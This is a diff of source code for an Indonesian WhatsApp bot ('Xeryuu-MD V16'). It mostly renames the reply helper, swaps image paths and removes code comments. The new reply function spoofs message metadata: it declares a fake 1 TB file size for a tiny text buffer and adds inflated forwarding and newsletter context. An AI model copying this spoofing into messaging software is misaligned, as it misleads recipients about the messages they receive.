@@ -440,7 +440,7 @@ async function waitForXeryuuBroadcastSocket(fallbackSocket, state, options = {})
         }
         if (!loggedWaiting) {
             loggedWaiting = true
-            console.warn('[BROADCAST] Koneksi WhatsApp belum siap; menunggu reconnect dan broadcast akan dilanjutkan otomatis.')
+            console.warn('Koneksi WhatsApp belum siap; menunggu reconnect dan broadcast akan dilanjutkan otomatis.')
         }
         if (state) state.status = 'waiting-connection'
         await new Promise(resolve => setTimeout(resolve, 1000))
@@ -467,7 +467,7 @@ async function fetchXeryuuBroadcastGroups(fallbackSocket, state) {
             reconnectRetries++
             previousSocket = ready.socket
             state.status = 'waiting-connection'
-            console.warn(`[BROADCAST] Gagal mengambil daftar grup karena koneksi terputus; menunggu reconnect (${reconnectRetries}/3).`)
+            console.warn(`Gagal mengambil daftar grup karena koneksi terputus; menunggu reconnect (${reconnectRetries}/3).`)
         }
     }
     return null
@@ -564,8 +564,7 @@ function isMenuOrFormattedXeryuuReply(value) {
     const text = String(value || '').trim();
     return !text || /^```[\s\S]*```$/.test(text);
 }
-
-// Keep menu/catalog messages free of an added external preview card, as before.
+//
 function isXeryuuMenuText(value) {
     const text = String(value || '').trim();
     return /\b(menu|daftar fitur|list fitur|listproduk|daftar produk|pilih menu|menu utama|top up game|nokos ruangotp|bot service|store katalog|katalog produk)\b/i.test(text) ||
@@ -577,9 +576,7 @@ function styleXeryuuReplyText(value) {
     if (!raw.trim() || /^\s*```[\s\S]*```\s*$/.test(raw)) return raw;
     return `\`\`\`${raw}\`\`\``;
 }
-
-// Semua balasan di chat yang sama mengutip pesan pemicu. Proxy dibuat per pesan
-// agar konteks reply tidak saling tertukar ketika beberapa pesan diproses bersamaan.
+// 
 function applyQuoteContextToRelayPayload(payload, incomingMessage) {
     const key = incomingMessage?.key || {}
     const quoteContext = {
@@ -708,24 +705,18 @@ function withDefaultQuotedReplies(baseConn, incomingMessage) {
                     const optionsObject = options && typeof options === 'object' && !Array.isArray(options)
                         ? options
                         : {};
-                    // Jangan mengubah @nomor menjadi @nama secara literal: teks seperti
-                    // @nama_user tidak cocok dengan mentionedJid dan bukan mention WhatsApp.
-                    // Normalisasi ini berlaku untuk semua pesan teks, termasuk notifikasi AFK,
-                    // welcome/goodbye, game, moderasi, broadcast, dan pesan ke owner.
+                    
                     let outgoingContent = (!specialPayload)
                         ? normalizeOutboundMentionPayload(content)
                         : content;
-
-                    // Teks biasa dibuat konsisten; media dan payload interaktif tetap utuh.
-                    // Semua kiriman ke chat pemanggil tetap mengutip pesan pemicunya.
+                        
                     if (sameChat && !specialPayload &&
                         outgoingContent && typeof outgoingContent === 'object' && typeof outgoingContent.text === 'string') {
                         const allowedTextKeys = new Set(['text', 'mentions', 'contextInfo']);
                         const isPlainTextPayload = Object.keys(outgoingContent).every(key => allowedTextKeys.has(key));
                         if (isPlainTextPayload) {
                             const originalText = outgoingContent.text;
-                            // Pertahankan token @nomor yang cocok dengan metadata mention.
-                            // WhatsApp sendiri yang menentukan nama kontak yang ditampilkan.
+                         
                             const isMenuOrAlreadyFormatted = isMenuOrFormattedXeryuuReply(originalText);
                             const styledText = isMenuOrAlreadyFormatted
                                 ? originalText
@@ -752,7 +743,7 @@ function withDefaultQuotedReplies(baseConn, incomingMessage) {
                                     styledContext.externalAdReply = {
                                         title: 'XERYUU-MD V16',
                                         body: 'created by: XnalzNotDev',
-                                        thumbnail: readProjectAsset('media/xeryuu.jpg'),
+                                        thumbnail: readProjectAsset('media/xeryuu.png'),
                                         mediaType: 1,
                                         renderLargerThumbnail: false
                                     };
@@ -948,7 +939,7 @@ const Kata = async (content) => {
             externalAdReply: {
                 title: "Xeryuu-Md V16 × Sendrich",
                 body: "created by: XnalzNotDev",
-                thumbnail: readProjectAsset('media/xeryuu.jpg'),
+                thumbnail: readProjectAsset('media/xeryuu.png'),
                 mediaType: 1,
                 renderLargerThumbnail: false
             }
@@ -1381,7 +1372,7 @@ const lol = { key: {
   contextInfo: {
     mentionedJid: ["120363426041078526@newsletter"],
     forwardingScore: 999,
-    isForwarded: true,
+    isForwarded: false,
   }
 }
 
@@ -1774,7 +1765,7 @@ if (m.isGroup) {
     // kalau antilink biasa aktif
     if (antilinkGroups.includes(m.chat)) {
       await conn.sendMessage(m.chat, { delete: m.key })
-      Reply("🚫 Link grup terdeteksi!")
+      replyV1("🚫 Link grup terdeteksi!")
     }
     // kalau antilink2 (kick) aktif
     if (AntiLinkKick.includes(m.chat)) {
@@ -1801,7 +1792,7 @@ const tebak = async (teks) => {
             showAdAttribution: false,
             title: "Xeryuu-Md V16 × Sendrich",
             body: "created by: XnalzNotDev",
-            thumbnail: readProjectAsset('media/xeryuu.jpg'),
+            thumbnail: readProjectAsset('media/xeryuu.png'),
             mediaType: 1,
             renderLargerThumbnail: false
             }
@@ -1854,7 +1845,7 @@ if (m.isGroup && !m.key.fromMe && antitoxic[m.chat]?.active) {
       try {
         await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
       } catch (e) {
-        Reply('Gagal kick. Bot bukan admin?')
+        replyV1('Gagal kick. Bot bukan admin?')
       }
       delete antitoxic[m.chat].warnings[user]
       saveAntiToxic()
@@ -1991,7 +1982,7 @@ if (m.isGroup && !m.key.fromMe && antichannel[m.chat]?.antichannel) {
         try {
           await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
         } catch (e) {
-          Reply('Gagal kick. Bot bukan admin?')
+          replyV1('Gagal kick. Bot bukan admin?')
         }
         delete antichannel[m.chat].warnings[user]
         saveAntichannel()
@@ -2085,7 +2076,7 @@ await conn.sendMessage(m.chat, {text: `
 if (!isCmd) {
 let check = list.find(e => e.cmd == body.toLowerCase())
 if (check) {
-await Reply(check.respon)
+await replyV1(check.respon)
 }}
 
 //~~~~~~peler biji
@@ -2173,16 +2164,16 @@ return password;
 }
 
 function handleFeatureToggle(feature, command) {
-    if (!m.isGroup) return Reply(mess.group);
-    if (!isAdmins && !isOwner) return Reply(mess.admin);
-    if (args.length < 1) return Reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan');
+    if (!m.isGroup) return replyV1(mess.group);
+    if (!isAdmins && !isOwner) return replyV1(mess.admin);
+    if (args.length < 1) return replyV1('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan');
 
     if (args[0] === 'on') {
         db.chats[from][feature] = true;
-        return Reply(`is enabled`);
+        return replyV1(`is enabled`);
     } else if (args[0] === 'off') {
         db.chats[from][feature] = false;
-        return Reply(`is disabled`);
+        return replyV1(`is disabled`);
     }
 }
 
@@ -2228,7 +2219,7 @@ const KataAudio = async (content, audioUrl = null) => {
             showAdAttribution: false,
             title: "Xeryuu-Md V16 × Sendrich",
             body: "WANT TO EXCECUTOR",
-            thumbnail: readProjectAsset('media/xeryuu.jpg'),
+            thumbnail: readProjectAsset('media/xeryuu.png'),
             mediaType: 1,
             renderLargerThumbnail: false
             }
@@ -2251,6 +2242,7 @@ const KataAudio = async (content, audioUrl = null) => {
         await sendLocalMenuAudio(m);
     }
 };
+
 const audio = async (content) => {
     const localAudio = readProjectAsset('media/menu.mp3');
     return conn.sendMessage(m.chat, {
@@ -2280,76 +2272,60 @@ const audio = async (content) => {
     }, { quoted: m });
 };
 
-
-const Reply = async (content, options = {}) => {
-    const textContent = String(content ?? '')
-    const normalizedOptions = options && typeof options === 'object' ? options : {}
-    const { noAdReply = false, ...replyOptions } = normalizedOptions
-    const optionMentions = Array.isArray(replyOptions?.mentions) ? replyOptions.mentions : []
-    const mentions = [...new Set([m?.sender, ...optionMentions].filter(Boolean))]
-
-    const contextInfo = {
-        ...(replyOptions?.contextInfo || {}),
-        isForwarded: false,
-        forwardingScore: 256,
-        forwardedNewsletterMessageInfo: {
-            newsletterJid: '120363426041078526@newsletter',
-            newsletterName: `$ cd ./root/¡χηαℓz¿ 彡`,
-            serverMessageId: 1
-        }, 
-       externalAdReply: {
-          showAdAttribution: false, 
-          title: "Xeryuu-Md V16 × Sendrich",
-            body: "created by: XnalzNotDev",
-           thumbnailUrl: "https://img2.pixhost.to/images/7473/719259099_settomodders.jpg",
-            mediaType: 1,
-            renderLargerThumbnail: false
-        }
+const replyV1 = async (teks, options = {}) => {
+  const normalizedOptions = options && typeof options === 'object' && !Array.isArray(options)
+    ? options
+    : {};
+  const optionMentions = Array.isArray(normalizedOptions.mentions)
+    ? normalizedOptions.mentions
+    : [];
+  const mentions = [...new Set([m?.sender, ...optionMentions].filter(Boolean))];
+  const styledText = styleXeryuuReplyText(teks);
+  const thumbnail = readProjectAsset('media/XeryuMd-thumbnail.jpg');
+  const payload = {
+    document: Buffer.from('Xeryuu | MD✨'),
+    mimetype: 'image/jpg',
+    fileName: global.botname || botname,
+    fileLength: 1099511627776,
+    caption: styledText,
+    mentions,
+    contextInfo: {
+      ...(normalizedOptions.contextInfo && typeof normalizedOptions.contextInfo === 'object'
+        ? normalizedOptions.contextInfo
+        : {}),
+      forwardingScore: 9999,
+      isForwarded: false,
+      forwardedNewsletterMessageInfo: {
+        newsletterJid: global.idSaluran || idSaluran, 
+        newsletterName: global.namaSaluran || namaSaluran, 
+        serverMessageId: 127
+      }
     }
+  };
+  if (Buffer.isBuffer(thumbnail) && thumbnail.length) payload.jpegThumbnail = thumbnail;
 
-    if (noAdReply) {
-        delete contextInfo.externalAdReply
-        contextInfo.__xeryuuSuppressExternalAdReply = true
-    } else {
-        contextInfo.externalAdReply = {
-            showAdAttribution: false,
-            title: 'XERYUU-MD V16 × Sendrich',
-            body: 'created by: XnalzNotDev',
-            thumbnail: readProjectAsset('media/xeryuu.jpg'),
-            mediaType: 1,
-            renderLargerThumbnail: false
-        }
-    }
-
-    const richPayload = {
-        ...replyOptions,
-        text: textContent,
-        mentions,
-        contextInfo
-    }
-
+  try {
+    return await conn.sendMessage(m.chat, payload, { quoted: m });
+  } catch (firstError) {
     try {
-        return await conn.sendMessage(m.chat, richPayload, { quoted: m })
-    } catch (firstError) {
-        try {
-
-            return await conn.sendMessage(m.chat, {
-                text: textContent,
-                mentions,
-    
-                contextInfo: { __xeryuuSuppressBotMetadata: true }
-            }, { quoted: m })
-        } catch (secondError) {
-            console.error(
-                '[REPLY ERROR]',
-                firstError?.message || firstError,
-                'fallback:',
-                secondError?.message || secondError
-            )
-            throw secondError
-        }
+      return await conn.sendMessage(m.chat, {
+        text: styledText,
+        mentions,
+        contextInfo: { __xeryuuSuppressBotMetadata: true }
+      }, { quoted: qtoko });
+    } catch (secondError) {
+      console.error(
+        '[REPLY V1 ERROR]',
+        firstError?.message || firstError,
+        'fallback:',
+        secondError?.message || secondError
+      );
+      throw secondError;
     }
+  }
 };
+
+const Reply = async (content, options = {}) => replyV1(content, options);
 
 const sendCompatibilityMentionReply = async (name1, name2, jid1 = '', jid2 = '') => {
     const result = funMenu.scoreCompatibility(name1, name2)
@@ -2357,14 +2333,14 @@ const sendCompatibilityMentionReply = async (name1, name2, jid1 = '', jid2 = '')
     const rawPair = [jid1, jid2].map(normalizeMentionJid).filter(jid => /@(s\.whatsapp\.net|c\.us|lid)$/i.test(jid))
     const mentions = [...new Set(rawPair)]
 
-    if (mentions.length !== 2) return Reply(result.text)
+    if (mentions.length !== 2) return replyV1(result.text)
 
     const mentionTokens = mentions.map(jid => `@${jid.split('@')[0]}`)
     const text = `${result.text}\n\n💞 Pengguna yang dipasangkan:\n${mentionTokens[0]} ❤️ ${mentionTokens[1]}`
-    return Reply(text, { mentions })
+    return replyV1(text, { mentions })
 }
 
-const sendXeryuuImageReply = async (caption, imagePath = 'media/xeryuu.jpg') => {
+const sendXeryuuImageReply = async (caption, imagePath = 'media/xeryuu.png') => {
     const textContent = String(caption ?? '')
     const imageBuffer = readProjectAsset(imagePath)
     if (Buffer.isBuffer(imageBuffer) && imageBuffer.length) {
@@ -2378,10 +2354,10 @@ const sendXeryuuImageReply = async (caption, imagePath = 'media/xeryuu.jpg') => 
             console.warn('[XERYUU IMAGE REPLY FALLBACK]', error?.message || error)
         }
     }
-    return Reply(textContent)
+    return replyV1(textContent)
 }
 
-const sendXeryuuMenuArtwork = async (label, imagePath = 'media/xeryuu.jpg') => {
+const sendXeryuuMenuArtwork = async (label, imagePath = 'media/xeryuu.png') => {
     const imageBuffer = readProjectAsset(imagePath)
     if (!Buffer.isBuffer(imageBuffer) || !imageBuffer.length) return false
     const title = String(label || 'XERYUU MENU').replace(/[\r\n]+/g, ' ').trim().slice(0, 60)
@@ -2428,7 +2404,7 @@ const sendWaQuickReplyMenu = async ({ text, footer = 'Xeryuu-Md V16 × Sendrich 
     let artworkMedia = {}
     const effectiveImageBuffer = Buffer.isBuffer(imageBuffer) && imageBuffer.length
         ? imageBuffer
-        : readProjectAsset('media/xeryuu.jpg')
+        : readProjectAsset('media/xeryuu.png')
     if (Buffer.isBuffer(effectiveImageBuffer) && effectiveImageBuffer.length) {
         try {
             artworkMedia = await prepareWAMessageMedia({ image: effectiveImageBuffer }, { upload: conn.waUploadToServer })
@@ -2513,7 +2489,7 @@ const sendWaListMenu = async ({
         ? imageBuffer
         : (artworkName && STORE_ARTWORK_FILES[artworkName]
             ? readProjectAsset(STORE_ARTWORK_FILES[artworkName])
-            : readProjectAsset('media/xeryuu.jpg'))
+            : readProjectAsset('media/xeryuu.png'))
     if (Buffer.isBuffer(directArtwork) && directArtwork.length) {
         try {
             artworkMedia = await prepareWAMessageMedia(
@@ -2658,9 +2634,6 @@ const getBroadcastGroups = async ({ force = false } = {}) => {
     return broadcastGroupFetchPromise
 }
 
-// Blacklist broadcast uses a native single-select list, not a stack of quick_reply
-// buttons. WhatsApp limits quick_reply button counts; oversized sets can be rejected
-// by relayMessage and end up displaying the manual-text fallback instead of controls.
 const sendBlacklistBroadcastMenu = async (requestedPage = 1, notice = '') => {
     const groupObject = await getBroadcastGroups()
     const groups = Object.entries(groupObject || {})
@@ -2734,7 +2707,7 @@ const sendBlacklistBroadcastMenu = async (requestedPage = 1, notice = '') => {
         title: 'Kelola blacklist',
         footer: 'Xeryuu-MD V16 • Blacklist Broadcast',
         sections: [{ title: `Grup • halaman ${page}/${totalPages}`.slice(0, 24), rows }],
-        imageBuffer: readProjectAsset('media/xeryuu.jpg'),
+        imageBuffer: readProjectAsset('media/xeryuu.png'),
         fallbackText
     })
 }
@@ -2927,7 +2900,7 @@ const sendAdzanBlacklistMenu = async (requestedPage = 1, notice = '') => {
         title: 'Kelola filter adzan',
         footer: 'Xeryuu-MD V16 • Filter Auto Adzan',
         sections: [{ title: `Grup • halaman ${page}/${totalPages}`.slice(0, 24), rows }],
-        imageBuffer: readProjectAsset('media/xeryuu.jpg'),
+        imageBuffer: readProjectAsset('media/xeryuu.png'),
         fallbackText
     })
 }
@@ -2955,7 +2928,7 @@ const sendStoreProductSelectionMenu = async (kind = 'all', requestedPage = 1) =>
         .sort((a, b) => Number(a.price) - Number(b.price) || a.name.localeCompare(b.name))
 
     if (!products.length) {
-        return Reply(`📦 Produk belum tersedia untuk kategori ${config.heading.toLowerCase()}. Silakan hubungi owner.`)
+        return replyV1(`📦 Produk belum tersedia untuk kategori ${config.heading.toLowerCase()}. Silakan hubungi owner.`)
     }
 
     const pageSize = 7
@@ -3019,7 +2992,7 @@ const makeXeryuuReplyContextInfo = () => ({
     externalAdReply: {
         title: 'XERYUU-MD V16',
         body: 'created by: XnalzNotDev',
-        thumbnail: readProjectAsset('media/xeryuu.jpg'),
+        thumbnail: readProjectAsset('media/xeryuu.png'),
         mediaType: 1,
         renderLargerThumbnail: false
     }
@@ -3264,13 +3237,13 @@ const sendConvertPulsaWaListMenu = async options => {
 }
 
 const showConvertPulsaOperators = async (page = 0) => {
-    if (m.isGroup) return Reply('🔒 Demi keamanan nomor dan data penerima, fitur convert pulsa hanya dapat digunakan melalui chat pribadi bot.')
-    if (!convertPulsaService.ready()) return Reply('❌ API PesanJasa belum siap. Isi API key di global.convertPulsaConfig pada settings.js atau environment PESANJASA_CONVERT_API_KEY, lalu restart bot.')
+    if (m.isGroup) return replyV1('🔒 Demi keamanan nomor dan data penerima, fitur convert pulsa hanya dapat digunakan melalui chat pribadi bot.')
+    if (!convertPulsaService.ready()) return replyV1('❌ API PesanJasa belum siap. Isi API key di global.convertPulsaConfig pada settings.js atau environment PESANJASA_CONVERT_API_KEY, lalu restart bot.')
     try {
         const rateData = await convertPulsaService.getRates()
         const operators = safeConvertOperators(rateData.operators)
         const payoutMethods = safeConvertPayoutMethods(rateData.payoutMethods)
-        if (!operators.length) return Reply('❌ PesanJasa belum mengembalikan operator aktif. Tidak ada order dibuat.')
+        if (!operators.length) return replyV1('❌ PesanJasa belum mengembalikan operator aktif. Tidak ada order dibuat.')
         saveConvertPulsaSession({ step: 'operator', operators, payoutMethods, page: 0, operatorId: '', amount: null, requestedAt: null })
         const pageSize = 7
         const totalPages = Math.max(1, Math.ceil(operators.length / pageSize))
@@ -3300,7 +3273,7 @@ const showConvertPulsaOperators = async (page = 0) => {
         })
     } catch (error) {
         console.error('[CONVERT PULSA RATES]', error?.stack || error)
-        return Reply(`❌ Gagal mengambil kurs PesanJasa: ${error?.message || error}\nBelum ada transaksi yang dibuat.`)
+        return replyV1(`❌ Gagal mengambil kurs PesanJasa: ${error?.message || error}\nBelum ada transaksi yang dibuat.`)
     }
 }
 
@@ -3308,7 +3281,7 @@ const showConvertPulsaPayoutMethods = async (session, page = 0) => {
     const methods = safeConvertPayoutMethods(session?.payoutMethods)
     if (!methods.length) {
         convertPulsaService.clearSession('whatsapp', m.sender)
-        return Reply('❌ API /rates PesanJasa tidak mengembalikan daftar metode pencairan yang dapat dikenali. Demi menghindari salah tujuan, pilihan e-wallet tidak dibuat secara manual. Periksa respons/API provider atau hubungi PesanJasa.')
+        return replyV1('❌ API /rates PesanJasa tidak mengembalikan daftar metode pencairan yang dapat dikenali. Demi menghindari salah tujuan, pilihan e-wallet tidak dibuat secara manual. Periksa respons/API provider atau hubungi PesanJasa.')
     }
     const pageSize = 7
     const totalPages = Math.max(1, Math.ceil(methods.length / pageSize))
@@ -3338,14 +3311,14 @@ const showConvertPulsaPayoutMethods = async (session, page = 0) => {
 
 const convertPulsaSetAmount = async rawAmount => {
     const session = convertPulsaSessionForCurrentUser()
-    if (!session || !['amount', 'operator'].includes(String(session.step || ''))) return Reply(`Pilih operator terlebih dahulu melalui ${prefix}convertpulsa.`)
+    if (!session || !['amount', 'operator'].includes(String(session.step || ''))) return replyV1(`Pilih operator terlebih dahulu melalui ${prefix}convertpulsa.`)
     const operator = (session.operators || []).find(item => String(item.id) === String(session.operatorId))
-    if (!operator) return Reply(`❌ Sesi operator tidak valid. Mulai ulang dengan ${prefix}convertpulsa.`)
-    if (!operator.available) return Reply('❌ Operator sedang offline/maintenance menurut API PesanJasa. Pilih operator lain.')
+    if (!operator) return replyV1(`❌ Sesi operator tidak valid. Mulai ulang dengan ${prefix}convertpulsa.`)
+    if (!operator.available) return replyV1('❌ Operator sedang offline/maintenance menurut API PesanJasa. Pilih operator lain.')
     const amount = convertPulsaService.amountValue(rawAmount)
-    if (!Number.isSafeInteger(amount) || amount <= 0) return Reply('❌ Nominal pulsa tidak valid. Masukkan angka, misalnya 50000.')
-    if (operator.minAmount != null && amount < operator.minAmount) return Reply(`❌ Nominal di bawah minimum provider: Rp${convertPulsaService.formatMoney(operator.minAmount)}.`)
-    if (operator.maxAmount != null && amount > operator.maxAmount) return Reply(`❌ Nominal melewati maksimum provider: Rp${convertPulsaService.formatMoney(operator.maxAmount)}.`)
+    if (!Number.isSafeInteger(amount) || amount <= 0) return replyV1('❌ Nominal pulsa tidak valid. Masukkan angka, misalnya 50000.')
+    if (operator.minAmount != null && amount < operator.minAmount) return replyV1(`❌ Nominal di bawah minimum provider: Rp${convertPulsaService.formatMoney(operator.minAmount)}.`)
+    if (operator.maxAmount != null && amount > operator.maxAmount) return replyV1(`❌ Nominal melewati maksimum provider: Rp${convertPulsaService.formatMoney(operator.maxAmount)}.`)
     try {
         const result = await convertPulsaService.calculate(operator.id, amount)
         const methods = safeConvertPayoutMethods(session.payoutMethods)
@@ -3356,7 +3329,7 @@ const convertPulsaSetAmount = async rawAmount => {
         return showConvertPulsaPayoutMethods(updated, 0)
     } catch (error) {
         console.error('[CONVERT PULSA CALCULATE]', error?.stack || error)
-        return Reply(`❌ Gagal menghitung kurs melalui PesanJasa: ${error?.message || error}\nBelum ada order dibuat atau pulsa dikirim.`)
+        return replyV1(`❌ Gagal menghitung kurs melalui PesanJasa: ${error?.message || error}\nBelum ada order dibuat atau pulsa dikirim.`)
     }
 }
 
@@ -3372,7 +3345,7 @@ const handleConvertPulsaTextInput = async value => {
     if (session.step === 'payout_number') {
         const number = input.replace(/[\s-]/g, '')
         if (!/^\d{6,30}$/.test(number)) {
-            await Reply('❌ Nomor rekening/e-wallet harus berupa 6–30 digit angka. Coba lagi atau tekan Batalkan draft.')
+            await replyV1('❌ Nomor rekening/e-wallet harus berupa 6–30 digit angka. Coba lagi atau tekan Batalkan draft.')
             return true
         }
         saveConvertPulsaSession({ step: 'payout_name', payoutAccountNumber: number })
@@ -3386,7 +3359,7 @@ const handleConvertPulsaTextInput = async value => {
     }
     if (session.step === 'payout_name') {
         if (input.length < 2 || input.length > 80 || /[\r\n<>]/.test(input)) {
-            await Reply('❌ Nama pemilik akun harus 2–80 karakter dan tidak boleh berisi baris baru atau tanda < >. Coba lagi.')
+            await replyV1('❌ Nama pemilik akun harus 2–80 karakter dan tidak boleh berisi baris baru atau tanda < >. Coba lagi.')
             return true
         }
         saveConvertPulsaSession({ step: 'sender_phone', payoutAccountName: input })
@@ -3401,7 +3374,7 @@ const handleConvertPulsaTextInput = async value => {
     if (session.step === 'sender_phone') {
         const number = input.replace(/[\s-]/g, '')
         if (!/^\d{8,15}$/.test(number)) {
-            await Reply('❌ Nomor pengirim harus 8–15 digit angka, gunakan kode negara bila perlu. Coba lagi.')
+            await replyV1('❌ Nomor pengirim harus 8–15 digit angka, gunakan kode negara bila perlu. Coba lagi.')
             return true
         }
         const confirmed = saveConvertPulsaSession({ step: 'confirm', senderPhoneNumber: number })
@@ -3438,14 +3411,14 @@ const convertPulsaProofStatusLabel = tx => {
 }
 
 const startConvertPulsaProof = async rawRef => {
-    if (m.isGroup) return Reply('🔒 Bukti transaksi convert pulsa hanya dapat dikirim melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Bukti transaksi convert pulsa hanya dapat dikirim melalui chat pribadi bot.')
     const ref = String(rawRef || '').trim().toUpperCase()
-    if (!ref) return Reply(`Contoh: ${prefix}cpbukti CPX...`)
+    if (!ref) return replyV1(`Contoh: ${prefix}cpbukti CPX...`)
     const tx = convertPulsaService.findOrder(ref)
-    if (!tx || tx.channel !== 'whatsapp' || tx.userId !== m.sender) return Reply('❌ Referensi tidak ditemukan atau bukan milik akun kamu.')
-    if (!convertPulsaProofAllowed(tx)) return Reply('⚠️ Bukti hanya bisa dikirim untuk order PesanJasa aktif yang sudah memiliki instruksi resmi. Cek status terlebih dahulu; jangan kirim pulsa jika nomor tujuan belum muncul.')
-    if (Number(tx.proofCount || 0) >= 3) return Reply('Batas 3 bukti untuk transaksi ini sudah tercapai. Hubungi owner untuk bantuan lanjutan.')
-    if (Date.now() - Number(tx.proofSubmittedAt || 0) < 15000) return Reply('Bukti baru saja dikirim. Tunggu sebentar sebelum mengirim bukti berikutnya.')
+    if (!tx || tx.channel !== 'whatsapp' || tx.userId !== m.sender) return replyV1('❌ Referensi tidak ditemukan atau bukan milik akun kamu.')
+    if (!convertPulsaProofAllowed(tx)) return replyV1('⚠️ Bukti hanya bisa dikirim untuk order PesanJasa aktif yang sudah memiliki instruksi resmi. Cek status terlebih dahulu; jangan kirim pulsa jika nomor tujuan belum muncul.')
+    if (Number(tx.proofCount || 0) >= 3) return replyV1('Batas 3 bukti untuk transaksi ini sudah tercapai. Hubungi owner untuk bantuan lanjutan.')
+    if (Date.now() - Number(tx.proofSubmittedAt || 0) < 15000) return replyV1('Bukti baru saja dikirim. Tunggu sebentar sebelum mengirim bukti berikutnya.')
     const previousSession = convertPulsaSessionForCurrentUser()
     const proofReturnStep = previousSession && previousSession.step !== 'proof_upload' && !previousSession.requestedAt
         ? String(previousSession.step || '')
@@ -3526,16 +3499,16 @@ const handleConvertPulsaProofMedia = async inboundMessage => {
     }
     if (!tx || tx.channel !== 'whatsapp' || tx.userId !== inboundMessage.sender || !convertPulsaProofAllowed(tx)) {
         restoreSession()
-        await Reply('⚠️ Sesi bukti tidak valid, instruksi resmi belum tersedia, atau order sudah tidak aktif. Status PesanJasa tidak diubah. Cek status/riwayat terlebih dahulu.')
+        await replyV1('⚠️ Sesi bukti tidak valid, instruksi resmi belum tersedia, atau order sudah tidak aktif. Status PesanJasa tidak diubah. Cek status/riwayat terlebih dahulu.')
         return true
     }
     if (Number(tx.proofCount || 0) >= 3 || Date.now() - Number(tx.proofSubmittedAt || 0) < 15000) {
-        await Reply('⚠️ Batas bukti sudah tercapai atau bukti sebelumnya baru saja dikirim. Tidak ada file baru yang diteruskan. Cek status transaksi atau hubungi owner.')
+        await replyV1('⚠️ Batas bukti sudah tercapai atau bukti sebelumnya baru saja dikirim. Tidak ada file baru yang diteruskan. Cek status transaksi atau hubungi owner.')
         return true
     }
     const ownerJid = resolveOwnerWhatsAppJid()
     if (!ownerJid) {
-        await Reply('❌ Kontak owner belum terkonfigurasi dengan benar. Bukti belum diteruskan dan status transaksi tidak diubah.')
+        await replyV1('❌ Kontak owner belum terkonfigurasi dengan benar. Bukti belum diteruskan dan status transaksi tidak diubah.')
         return true
     }
 
@@ -3567,9 +3540,9 @@ Catatan: bukti bot-side untuk review manual; tidak dikirim ke API PesanJasa.`
         console.error('[CONVERT PULSA PROOF WA]', error?.stack || error)
         if (forwarded) {
             restoreSession()
-            await Reply(`⚠️ Owner sudah menerima foto untuk review manual, tetapi metadata bukti tidak berhasil disimpan: ${error?.message || error}. Status PesanJasa tidak diubah. Referensi: ${tx.ref}. Jangan kirim pulsa ulang.`)
+            await replyV1(`⚠️ Owner sudah menerima foto untuk review manual, tetapi metadata bukti tidak berhasil disimpan: ${error?.message || error}. Status PesanJasa tidak diubah. Referensi: ${tx.ref}. Jangan kirim pulsa ulang.`)
         } else {
-            await Reply(`❌ Bukti belum diteruskan ke owner: ${error?.message || error}. Sesi upload tetap aktif agar kamu bisa mencoba lagi. Status PesanJasa tidak diubah.`)
+            await replyV1(`❌ Bukti belum diteruskan ke owner: ${error?.message || error}. Sesi upload tetap aktif agar kamu bisa mencoba lagi. Status PesanJasa tidak diubah.`)
         }
         return true
     }
@@ -3579,7 +3552,7 @@ Catatan: bukti bot-side untuk review manual; tidak dikirim ke API PesanJasa.`
         await sendConvertPulsaTransaction(updated)
     } catch (error) {
         console.error('[CONVERT PULSA PROOF WA STATUS VIEW]', error?.stack || error)
-        await Reply(`✅ Bukti telah diteruskan ke owner untuk pemeriksaan manual. Status provider tidak berubah otomatis. Referensi: ${updated.ref}. Gunakan ${prefix}cpstatus ${updated.ref} untuk memeriksa status.`)
+        await replyV1(`✅ Bukti telah diteruskan ke owner untuk pemeriksaan manual. Status provider tidak berubah otomatis. Referensi: ${updated.ref}. Gunakan ${prefix}cpstatus ${updated.ref} untuk memeriksa status.`)
     }
     return true
 }
@@ -8274,9 +8247,9 @@ const processPlayMediaSelection = async (track, format, stored) => {
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
         const safeError = String(error?.message || '').replace(/[\r\n]/g, ' ').slice(0, 180);
         if (format === 'mp4') {
-            await Reply(`❌ Video MP4 belum berhasil dikirim. Penyedia video mungkin sedang bermasalah atau ukuran video terlalu besar. Coba tekan MP4 sekali lagi beberapa saat nanti.${safeError ? `\nDetail: ${safeError}` : ''}`);
+            await replyV1(`❌ Video MP4 belum berhasil dikirim. Penyedia video mungkin sedang bermasalah atau ukuran video terlalu besar. Coba tekan MP4 sekali lagi beberapa saat nanti.${safeError ? `\nDetail: ${safeError}` : ''}`);
         } else {
-            await Reply(`❌ Audio gagal dikirim. Silakan pilih MP3 lagi untuk mencoba ulang.${safeError ? `\nDetail: ${safeError}` : ''}`);
+            await replyV1(`❌ Audio gagal dikirim. Silakan pilih MP3 lagi untuk mencoba ulang.${safeError ? `\nDetail: ${safeError}` : ''}`);
         }
         return false;
     }
@@ -8289,16 +8262,16 @@ if (playFormatButtonMatch) {
     const requestedToken = playFormatButtonMatch[2].toLowerCase();
     const stored = global.playSearch?.[playSessionKey];
     if (!stored || stored.stage !== 'format' || stored.formatToken !== requestedToken) {
-        return Reply('⚠️ Pilihan format ini sudah kedaluwarsa atau bukan milik sesi kamu. Jalankan .play lagi untuk memilih lagu baru.');
+        return replyV1('⚠️ Pilihan format ini sudah kedaluwarsa atau bukan milik sesi kamu. Jalankan .play lagi untuk memilih lagu baru.');
     }
     if (stored.chat !== m.chat || stored.sender !== m.sender || Date.now() - Number(stored.createdAt || 0) > 10 * 60 * 1000) {
         delete global.playSearch[playSessionKey];
-        return Reply('⚠️ Pilihan lagu sudah kedaluwarsa. Silakan gunakan .play lagi.');
+        return replyV1('⚠️ Pilihan lagu sudah kedaluwarsa. Silakan gunakan .play lagi.');
     }
-    if (stored.processing) return Reply('⏳ Lagu sedang diproses. Tunggu sampai download selesai ya.');
+    if (stored.processing) return replyV1('⏳ Lagu sedang diproses. Tunggu sampai download selesai ya.');
     if (!stored.selectedTrack?.url || !normalizeYouTubeUrl(stored.selectedTrack.url)) {
         delete global.playSearch[playSessionKey];
-        return Reply('❌ Link lagu tidak valid. Silakan jalankan .play lagi.');
+        return replyV1('❌ Link lagu tidak valid. Silakan jalankan .play lagi.');
     }
     await processPlayMediaSelection(stored.selectedTrack, requestedFormat, stored);
     return;
